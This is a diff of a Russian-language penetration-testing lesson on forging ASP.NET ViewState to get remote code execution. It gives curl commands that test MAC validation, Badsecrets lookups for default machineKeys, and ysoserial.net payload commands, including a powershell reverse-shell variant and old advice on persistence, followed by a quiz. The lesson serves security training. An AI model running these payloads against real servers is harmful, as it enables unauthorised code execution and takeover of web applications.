@@ -15,316 +15,203 @@ estimated_minutes: 45
 summary: "ASP.NET ViewState: machineKey, подделка и RCE через ysoserial.net, ViewStateUserKey и обход MAC."
 ---
 
-ASP.NET ViewState (`__VIEWSTATE`) — это сериализованное состояние страницы, которое клиент возвращает серверу. Оно подписано (и опционально зашифровано) ключом `machineKey`. Если ключ утёк/предсказуем или MAC отключён, атакующий подделывает ViewState с **gadget-цепочкой** и получает RCE на сервере. Это классика «ASP.NET deserialization» и частая находка при аудите .NET-приложений.
+## Вопрос, с которого всё начинается
 
-## Теория: как устроен ViewState
+Java-десериализацию мы разобрали. У ASP.NET (веб-фреймворк Microsoft) есть похожая механика, но спрятанная на виду: почти каждая форма несёт в себе скрытое поле `__VIEWSTATE` — сериализованное состояние страницы, которое клиент возвращает серверу. Оно подписано ключом `machineKey`, чтобы его нельзя было подменить.
 
-`__VIEWSTATE` — base64 от `ObjectStateFormatter`-потока, содержащего сериализованные объекты. Структура:
+Вопрос: что, если ключ утёк, предсказуем или проверка подписи отключена? Тогда мы подделаем `__VIEWSTATE` с **gadget-цепочкой** и получим RCE. Разберём на одном примере.
 
-- первые байты — версия/флаги (`/wEP...` — распространённый префикс),
-- дальше — сериализованный граф объектов (тип `ObjectStateFormatter`),
-- целостность защищена MAC (`machineKey` validation).
+## Наш пример
 
-Проверки: если `EnableViewStateMac="false"` (или взломан `machineKey`), можно подменить поток. В старых версиях .NET (до патча MS12-066/MS13-053) MAC-обход позволял RCE без ключа (ViewState MAC bypass).
-
-## Инструменты
-
-- **`ysoserial.net`** — генерация ViewState payload:
+Есть корпоративное ASP.NET-приложение `intranet.example`. Открываем страницу и находим скрытое поле:
 
 ```bash
-ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" \
-  --path="/default.aspx" --apppath="/" --decryptionalg="AES" \
-  --decryptionkey="<hex>" --validationalg="HMACSHA256" --validationkey="<hex>"
+$ curl -s https://intranet.example/Default.aspx | grep -o '__VIEWSTATE[^"]*' | head -c 120
+__VIEWSTATE=/wEPDwUKMTI3NDk4NTY3OWRk...
 ```
 
-- **`Badsecrets`** — поиск предсказуемых/дефолтных `machineKey`.
-- **`viewgen`** — генерация с автоопределением формата.
-- **`ViewStateDecoder`/`ViewState Parser`** — разбор.
+`/wEP...` — base64 от потока `ObjectStateFormatter` (это встроенный сериализатор ASP.NET). Декодируем начало:
 
-## Разобранный пример: утёкший machineKey → RCE
+```bash
+$ echo '/wEPDwUKMTI3NDk4NTY3OWRk' | base64 -d | xxd | head -1
+00000000: ff01 1f02 0000 0000 0000 0000 0000 0000  ................
+```
 
-Шаг 1 — находим `machineKey` в `web.config` (утечка через backup/git/LFI/ошибку):
+`ff 01 1f` — маркер формата. Внутри — сериализованный граф объектов. Целостность защищена **MAC** (кодом аутентичности сообщения) на ключе `machineKey`. Первый вопрос, который надо решить: **проверяется ли эта подпись?**
+
+## Шаг 1: проверяем, включён ли MAC
+
+Самый быстрый тест — испортить ViewState и посмотреть на реакцию сервера:
+
+```bash
+# 1) берём оригинал
+$ curl -s https://intranet.example/Default.aspx | grep -o '__VIEWSTATE[^"]*' | head -1
+# 2) меняем последний символ и отправляем
+$ curl -s -X POST https://intranet.example/Default.aspx \
+  --data-urlencode '__VIEWSTATE=/wEPDwUKMTI3NDk4NTY3OWRkZZZ' | grep -i MAC
+```
+
+Если сервер ответил ошибкой `Validation of viewstate MAC failed` — подпись проверяется, и нам нужен ключ. Если ошибки нет — MAC отключён (`EnableViewStateMac="false"`), и payload можно сгенерировать **без ключа**. В старых .NET (до патчей MS12-066/MS13-053) существовал даже обход проверки MAC без ключа — на непропатченных системах он работал.
+
+## Шаг 2: ищем `machineKey`
+
+Если MAC включён, ищем ключ `machineKey` в конфиге приложения `web.config`:
 
 ```xml
 <machineKey validationKey="..." decryptionKey="..." validation="HMACSHA256" decryption="AES"/>
 ```
 
-Шаг 2 — генерируем ViewState с RCE:
+Где он утекает:
+
+- **исходники:** `.git`, backup-архивы, LFI (см. `web-git-env-exposure`);
+- **дефолтные ключи** из документации, туториалов, старых шаблонов — их знает инструмент `Badsecrets`;
+- **verbose error pages**, иногда раскрывающие конфигурацию;
+- **общие конфиги:** приложения, развёрнутые из одного шаблона, делят ключ.
 
 ```bash
-ysoserial.exe -p ViewState -g TextFormattingRunProperties \
-  -c "cmd /c powershell -e <base64>" \
-  --path="/Default.aspx" --apppath="/" \
-  --validationkey="<VALIDATIONKEY>" --validationalg="SHA1" \
-  --decryptionkey="<DECRYPTIONKEY>" --decryptionalg="AES" \
-  --islegacy
+$ python3 -m badsecrets --url https://intranet.example/Default.aspx
+[+] Known Secret: ...   # можно подписывать ViewState
 ```
 
-Шаг 3 — отправляем как `__VIEWSTATE`:
+## Шаг 3: генерируем payload
+
+Инструмент `ysoserial.net` (аналог `ysoserial` для .NET) собирает ViewState с gadget-цепочкой. Если ключ известен:
 
 ```bash
-curl -s "https://app.example/Default.aspx" --data-urlencode "__VIEWSTATE=<payload>"
-```
-
-Шаг 4 — сервер десериализует → RCE (reverse shell/OOB).
-
-## Разобранный пример: MAC disabled
-
-Если `enableViewStateMac="false"` — можно подменить ViewState без ключа. `ysoserial.net` с `--generator=...` и без ключей (или `viewgen`):
-
-```bash
-ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c calc" --path="/x.aspx" --apppath="/"
-```
-
-Проверка: измените ViewState (добавьте символ) и посмотрите, отвечает ли сервер ошибкой MAC (`Validation of viewstate MAC failed`) — если нет, MAC отключён.
-
-## Обходы и детали
-
-- **Версия .NET** определяет доступные gadget'ы (`TypeConfuseDelegate`, `TextFormattingRunProperties`, `ActivitySurrogateDisableTypeCheck`).
-- **`__VIEWSTATEENCRYPTED`** — если ViewState зашифрован, нужен `decryptionKey`.
-- **`__EVENTVALIDATION`** — иногда тоже нужно подписать.
-- **Кросс-версийные ключи** — `machineKey` может быть дефолтным (из туториалов) — `Badsecrets` их знает.
-- **Legacy vs modern** — флаг `--islegacy` для старых форматов.
-
-## Где искать machineKey
-
-- `web.config` (утечка через `.git`, backup, LFI — см. `web-git-env-exposure`, `web-php-wrappers`).
-- Дефолтные ключи из документации/туториалов (Badsecrets).
-- Ошибки/`__VIEWSTATEGENERATOR`.
-- `machine.config` (если утёк).
-
-## Что дальше / decision
-
-1. Есть `__VIEWSTATE` → проверьте, валидируется ли MAC (изменение → ошибка?).
-2. MAC отключён → генерируйте payload без ключа.
-3. Есть `machineKey` → `ysoserial.net -p ViewState` с ключами.
-4. Нет ключа → `Badsecrets` на дефолтные/предсказуемые.
-5. RCE → устойчивый канал + read-back.
-
-## Разобранный пример: MAC bypass в старых .NET
-
-До патчей MS12-066/MS13-053 существовал обход проверки MAC без ключа (CVE-2012-0005 и др.): можно было подменить ViewState, добавив валидный MAC, вычисленный через уязвимость в обработке. В более поздних версиях обход закрыт, но на непропатченных .NET он работал. Проверка:
-
-```bash
-# изменение ViewState не вызывает "Validation of viewstate MAC failed" -> MAC не проверяется/обход
-curl -s "https://app.example/Default.aspx" --data-urlencode "__VIEWSTATE=/wEPDwUJ..."
-```
-
-Если сервер отвечает 200 без ошибки MAC — можно генерировать payload без ключа.
-
-## Инструменты (расширенно)
-
-- **`ysoserial.net`** — основной генератор: `-p ViewState -g <gadget>`.
-- **`Badsecrets`** — база дефолтных/предсказуемых `machineKey` (проверка оффлайн).
-- **`viewgen`/`ViewStateGenerator`** — генерация с автоопределением формата.
-- **`ViewStateDecoder`** — разбор существующего ViewState.
-
-```bash
-# проверка дефолтного ключа через badsecrets
-python3 -m badsecrets --url https://app.example/Default.aspx
-```
-
-## Что дальше / decision
-
-1. Есть `__VIEWSTATE` → измените байт и проверьте реакцию (MAC?).
-2. MAC отключён → генерируйте payload без ключа.
-3. Есть `machineKey` → `ysoserial.net -p ViewState` с ключами.
-4. Нет ключа → `Badsecrets` (дефолтные/предсказуемые).
-5. RCE → устойчивый канал + read-back.
-
-## Частые ошибки
-
-- **Путать ViewState с обычной сериализацией Java.** Это .NET `ObjectStateFormatter`.
-- **Забыть про MAC.** Без ключа/MAC-off payload не пройдёт.
-- **Не проверить версию .NET.** Gadget'ы разные.
-- **Игнорировать `__EVENTVALIDATION`.** Иногда подпись нужна и там.
-- **Ломать прод.** RCE — только с согласия.
-
-## Полный разбор: MAC-off ViewState → RCE (с выводом)
-
-End-to-end на ASP.NET-приложении с отключённой проверкой MAC.
-
-Шаг 1. Находим страницу с ViewState и проверяем MAC:
-
-```bash
-curl -s https://app.example/Default.aspx | grep -o '__VIEWSTATE[^>]*' | head -c 120
-# __VIEWSTATE=/wEPDwUKMT... 
-# меняем один символ в значении и отправляем снова
-curl -s -X POST https://app.example/Default.aspx --data-urlencode '__VIEWSTATE=/wEPDwUKMT...X' | grep -i 'MAC'
-# (пусто)  -> ошибки "Validation of viewstate MAC failed" нет => MAC отключён/не проверяется
-```
-
-Шаг 2. Генерируем payload без ключа (MAC-off):
-
-```bash
-ysoserial.exe -p ViewState -g TypeConfuseDelegate \
-  -c "cmd /c whoami" --path="/Default.aspx" --apppath="/" --islegacy
-# -> base64 payload
-```
-
-Шаг 3. Отправляем:
-
-```bash
-PAYLOAD=$(ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --path="/Default.aspx" --apppath="/" --islegacy | tail -1)
-curl -s -X POST https://app.example/Default.aspx --data-urlencode "__VIEWSTATE=$PAYLOAD"
-```
-
-Шаг 4. Для RCE без вывода — reverse shell/OOB:
-
-```bash
-ysoserial.exe -p ViewState -g TextFormattingRunProperties \
-  -c "cmd /c powershell -e <base64-revshell>" --path="/Default.aspx" --apppath="/"
-```
-
-Шаг 5. Read-back: подтвердите выполнение (слушатель/коллаборатор), затем закрепитесь.
-
-## Reference-таблица: gadget'ы и версии .NET
-
-| Gadget | Условие | Примечание |
-|--------|---------|-----------|
-| TypeConfuseDelegate | .NET 4.x | надёжный, часто работает |
-| TextFormattingRunProperties | .NET 4.x | популярен, есть вариант для 4.8 |
-| ActivitySurrogateDisableTypeCheck | современный .NET | обходит проверки типов |
-| WindowsIdentity | — | вызов через делегаты |
-| PSObject (для PowerShell) | — | если доступен PS |
-| ObjectDataProvider | WPF | зависит от сборок |
-
-Флаги `ysoserial.net`: `--path` (URL страницы), `--apppath`, `--islegacy`, `--validationkey`/`--decryptionkey` (если ключ известен), `--generator` (VIEWSTATEGENERATOR).
-
-## Badsecrets и дефолтные machineKey
-
-Многие приложения используют **дефолтные** `machineKey` из документации/туториалов/старых шаблонов. `Badsecrets` проверяет их оффлайн:
-
-```bash
-pip install badsecrets
-python3 -m badsecrets --url https://app.example/Default.aspx
-# [+] Known Secret: ...  -> можно подписывать ViewState
-```
-
-Если ключ найден — генерируем ViewState с ним:
-
-```bash
-ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" \
+$ ysoserial.exe -p ViewState -g TypeConfuseDelegate \
+  -c "cmd /c whoami" \
   --path="/Default.aspx" --apppath="/" \
   --validationkey="<hex>" --validationalg="SHA1" \
   --decryptionkey="<hex>" --decryptionalg="AES"
 ```
 
-Также ищите `machineKey` в утечках (`web.config` через `.git`/backup/LFI) — см. `web-git-env-exposure`.
-
-## Что делать дальше / решение
-
-1. **Найти ViewState** (`__VIEWSTATE`) и проверить MAC (изменение → ошибка?).
-2. **MAC off** → генерировать payload без ключа (`ysoserial.net --islegacy`).
-3. **Ключ известен/утёк** → генерировать с `--validationkey/--decryptionkey`.
-4. **Ключ неизвестен** → `Badsecrets` (дефолтные/предсказуемые).
-5. **Определить версию .NET** и выбрать gadget.
-6. **RCE подтвердить** read-back (`whoami`/OOB) и закрепиться.
-7. **Проверить `__EVENTVALIDATION`** — иногда нужна и его подпись.
-
-## Структура ViewState и парсинг
-
-Понимание формата помогает отличить «MAC-off» от «нужен ключ».
-
-- **Префикс:** base64 от потока `ObjectStateFormatter`. Частые начала: `/wEP...`, `/wEPDwU...`. `/wEP` — маркер.
-- **`__VIEWSTATEGENERATOR`:** идентификатор генератора (иногда нужен для валидной генерации).
-- **`__EVENTVALIDATION`:** отдельный MAC-защищённый блок для валидации событий.
-- **`__VIEWSTATEENCRYPTED`:** маркер, что ViewState зашифрован.
-
-Разбор существующего значения:
+Если MAC отключён — без ключей, с флагом `--islegacy` для старых форматов:
 
 ```bash
-echo '/wEPDwUKMT...' | base64 -d | xxd | head
-# ff 01 1f ...  -> ObjectStateFormatter
+$ ysoserial.exe -p ViewState -g TypeConfuseDelegate \
+  -c "cmd /c whoami" --path="/Default.aspx" --apppath="/" --islegacy
 ```
 
-Проверка «валидируется ли MAC» — самый быстрый тест:
+Выбор gadget зависит от версии .NET:
+
+| Gadget | Условие |
+|--------|---------|
+| `TypeConfuseDelegate` | .NET 4.x, надёжный, часто работает |
+| `TextFormattingRunProperties` | .NET 4.x, популярен |
+| `ActivitySurrogateDisableTypeCheck` | современный .NET, обходит проверки типов |
+| `WindowsIdentity` | вызов через делегаты |
+| `ObjectDataProvider` | WPF, зависит от сборок |
+
+## Шаг 4: доставляем и подтверждаем
+
+Отправляем payload как `__VIEWSTATE`:
 
 ```bash
-# 1) взять оригинальный ViewState
-curl -s https://app.example/Default.aspx | grep -o '__VIEWSTATE[^"]*' | head -1
-# 2) изменить последний символ и отправить
-curl -s -X POST https://app.example/Default.aspx --data-urlencode '__VIEWSTATE=/wEPDwUKMT...ZZZ'
-# если ответ 500 "Validation of viewstate MAC failed" -> MAC включён (нужен ключ)
-# если 200/ошибка без MAC -> MAC выключен (payload без ключа)
+$ PAYLOAD=$(ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" \
+    --path="/Default.aspx" --apppath="/" --islegacy | tail -1)
+$ curl -s -X POST https://intranet.example/Default.aspx \
+  --data-urlencode "__VIEWSTATE=$PAYLOAD"
 ```
 
-Если MAC включён, ищем `machineKey`: утечки (`web.config` через `.git`/backup/LFI), дефолтные значения (Badsecrets), иногда `machineKey` в `machine.config` или предсказуемый (сгенерированный слабо).
-
-## Где искать machineKey
-
-- **Утечка исходников:** `.git`, backup-архивы, LFI (см. `web-git-env-exposure`).
-- **Дефолтные ключи:** из документации, туториалов, старых шаблонов — `Badsecrets` знает их базу.
-- **Ошибки:** verbose error pages иногда раскрывают конфигурацию.
-- **Общие/скопированные конфиги:** приложения, развёрнутые из одного шаблона, делят ключ.
+Вывод команды в ответ не попадает — сервер десериализует и выполняет «в стороне». Поэтому доказательство строится через **OOB** или reverse shell:
 
 ```bash
-python3 -m badsecrets --url https://app.example/Default.aspx
-# или оффлайн по перехваченному ViewState
-python3 -m badsecrets --viewstate '/wEPDwUKMT...' --path '/Default.aspx'
+$ ysoserial.exe -p ViewState -g TextFormattingRunProperties \
+  -c "cmd /c powershell -e <base64-revshell>" --path="/Default.aspx" --apppath="/"
 ```
 
-## Быстрый чек-лист
+Пришёл обратный шелл — RCE подтверждён. Обязательно сделай **read-back** (`whoami` в шелле), прежде чем считать находку подтверждённой.
 
-1. Найти страницу с `__VIEWSTATE`.
-2. Проверить MAC (изменить байт → ошибка?).
-3. MAC off → `ysoserial.net --islegacy`.
-4. Ключ утёк/дефолт → `ysoserial.net` с ключами.
-5. Определить версию .NET → выбрать gadget.
-6. RCE → read-back и закрепление.
+## Шаг 5: соседние поля
 
-## Итог по ViewState
+`__VIEWSTATE` — не единственное поле. Рядом могут быть:
 
-ViewState-атака сводится к трём вопросам: (1) проверяется ли MAC, (2) известен ли `machineKey`, (3) какой gadget подходит версии .NET. Ответы дают либо payload без ключа, либо подпись известным/дефолтным ключом. Всегда проверяйте `__EVENTVALIDATION` и `__VIEWSTATEGENERATOR`, и подтверждайте RCE read-back'ом.
+- **`__VIEWSTATEGENERATOR`** — идентификатор генератора; иногда нужен для валидной генерации.
+- **`__EVENTVALIDATION`** — отдельный MAC-защищённый блок для валидации событий; иногда нужно подписать и его.
+- **`__VIEWSTATEENCRYPTED`** — маркер, что ViewState зашифрован; тогда нужен `decryptionKey`.
 
-## Дополнительно: ViewState и .NET-патчи
+Разбирать существующее значение удобно `ViewStateDecoder` — он печатает дерево объектов и помогает понять формат.
 
-Обновление .NET и включённый MAC (`EnableViewStateMac`) закрывают большинство векторов. Если видите свежую версию .NET с включённым MAC и уникальным `machineKey` — ViewState, скорее всего, не вектор; переходите к другим классам (.NET deser через `BinaryFormatter` в других полях, `__EVENTVALIDATION`, JSON-десериализаторы).
+## Шаг 6: когда ViewState не вектор
+
+Если видишь свежую версию .NET, включённый MAC и уникальный (не дефолтный) `machineKey` — ViewState, скорее всего, закрыт. Не записывай «безопасно» сгоряча: переходи к другим .NET-векторам — десериализация через `BinaryFormatter` в других полях, `__EVENTVALIDATION`, JSON-десериализаторы. Методология та же: детект → инвентаризация ключей/классов → gadget → доставка → OOB.
+
+Отдельно стоит помнить, что ViewState — это не «одно поле», а целое семейство. Кроме `__VIEWSTATE` в форме могут быть `__VIEWSTATEENCRYPTED` (маркер шифрования), `__EVENTTARGET`, `__EVENTARGUMENT` и `__EVENTVALIDATION`. Последнее тоже защищено MAC и иногда содержит сериализованные данные, которые можно подделать при известном ключе. Поэтому, найдя утечку `machineKey`, проверь все скрытые поля страницы, а не только главный blob. Разбор страницы целиком (`grep -o '__[A-Z]*'` по HTML) покажет полный список кандидатов.
+
+## Шаг 7: где искать утечку ключа в реальном тесте
+
+Чаще всего `machineKey` приходит из утёкших исходников. Порядок действий: проверь открытый `.git` (см. `web-git-env-exposure`), бэкапы (`web.config.bak`, `site.zip`), LFI-точки, а затем прогони `Badsecrets` на дефолтные ключи. Если приложение развёрнуто из публичного шаблона (старый шаблон форума, CMS-дистрибутив), ключ может быть **одинаковым у тысяч установок** — именно такие ключи и держит в базе `Badsecrets`. Нашёл ключ — генерируй ViewState с ним и проверяй read-back'ом.
+
+## Что мы теперь знаем
+
+- `__VIEWSTATE` — сериализованное состояние ASP.NET-страницы (`ObjectStateFormatter`), подписанное `machineKey`.
+- Первый тест — испортить ViewState и посмотреть, ругается ли сервер на MAC.
+- MAC отключён → payload без ключа; MAC включён → нужен `machineKey`.
+- Ключ ищут в `web.config` (утечки/.git/backup), дефолтах (`Badsecrets`).
+- `ysoserial.net` генерирует ViewState с gadget-цепочкой; выбор gadget зависит от версии .NET.
+- Рядом — `__EVENTVALIDATION` и `__VIEWSTATEGENERATOR`; иногда нужны и они.
+- Артефакт — reverse shell/read-back, а не «ошибка 500».
+
+## На что смотреть дальше
+
+- **Сначала проверь MAC** — это определяет, нужен ли ключ.
+- **Не путай с Java-десериализацией:** здесь .NET `ObjectStateFormatter`, инструмент `ysoserial.net`.
+- **Версия .NET** определяет доступные gadget'ы.
+- **`__EVENTVALIDATION`** иногда тоже подписывается — не забудь.
+- **Ключ может быть дефолтным** — прогони `Badsecrets` перед выводом «ключ неизвестен».
+- **Проверяй все скрытые поля страницы**, а не только `__VIEWSTATE`: `__EVENTVALIDATION` тоже подписано MAC и иногда содержит сериализованные данные.
+- **Только с согласия.** RCE меняет состояние прода.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Что хранится в __VIEWSTATE?"
+- question: "Что хранится в `__VIEWSTATE`?"
   options:
-    - "Пароль"
-    - "Сериализованное состояние страницы ASP.NET"
+    - "Пароль пользователя"
+    - "Сериализованное состояние ASP.NET-страницы"
     - "TLS-ключ"
-    - "Cookie"
-  answer: 1
-  explanation: "Состояние WebForms-страницы."
-- question: "Что нужно для подделки ViewState?"
-  options:
-    - "Только URL"
-    - "machineKey (validation/decryption)"
-    - "SQL"
     - "Cookie сессии"
   answer: 1
-  explanation: "Подпись проверяется ключом."
-- question: "Какой инструмент генерирует ViewState payload?"
+  explanation: "Это состояние WebForms-страницы в формате ObjectStateFormatter."
+- question: "Как быстро понять, проверяется ли MAC?"
   options:
-    - "ysoserial.net"
-    - "sqlmap"
-    - "ffuf"
-    - "nmap"
-  answer: 0
-  explanation: "ysoserial.net для .NET."
-- question: "Что означает EnableViewStateMac=false?"
+    - "Спросить у сервера версию"
+    - "Испортить ViewState и посмотреть, ругается ли сервер на `Validation of viewstate MAC failed`"
+    - "Отправить SQL"
+    - "Сменить браузер"
+  answer: 1
+  explanation: "Реакция на порчу значения показывает, включена ли проверка подписи."
+- question: "Что нужно, чтобы подделать ViewState при включённом MAC?"
+  options:
+    - "Только URL"
+    - "`machineKey` (validation/decryption)"
+    - "SQL-инъекция"
+    - "Cookie"
+  answer: 1
+  explanation: "Подпись проверяется ключом, поэтому нужен ключ (утёкший или дефолтный)."
+- question: 'Что означает `EnableViewStateMac="false"`?'
   options:
     - "Шифрование"
-    - "MAC не проверяется -> подделка без ключа"
+    - "MAC не проверяется — можно подделать ViewState без ключа"
     - "Сжатие"
-    - "Кеш"
+    - "Кеширование"
   answer: 1
-  explanation: "Отключённая проверка подписи."
-- question: "Где искать machineKey?"
+  explanation: "Отключённая проверка подписи позволяет генерировать payload без ключа."
+- question: "Где искать `machineKey`?"
   options:
-    - "В HTML"
-    - "В web.config (утечки/бэкапы/.git) или дефолтах"
-    - "В DNS"
-    - "В TLS"
+    - "В HTML-разметке"
+    - "В `web.config` (утечки/бэкапы/.git) или в дефолтах"
+    - "В DNS-записях"
+    - "В TLS-сертификате"
   answer: 1
-  explanation: "Конфиг приложения или утечка."
+  explanation: "Конфиг приложения или известные дефолтные значения."
 ```
+
+## Куда дальше
+
+Дальше мы разберём ещё одну PHP-технику, где RCE достигается **без десериализации объектов** — через обёртки и трюки файловых функций (`web-php-tricks`). А пока главное запомни: `__VIEWSTATE` — это сериализованный blob; если подпись не проверяется или ключ известен, он подделывается до RCE.
 
 ## Где пригодится
 
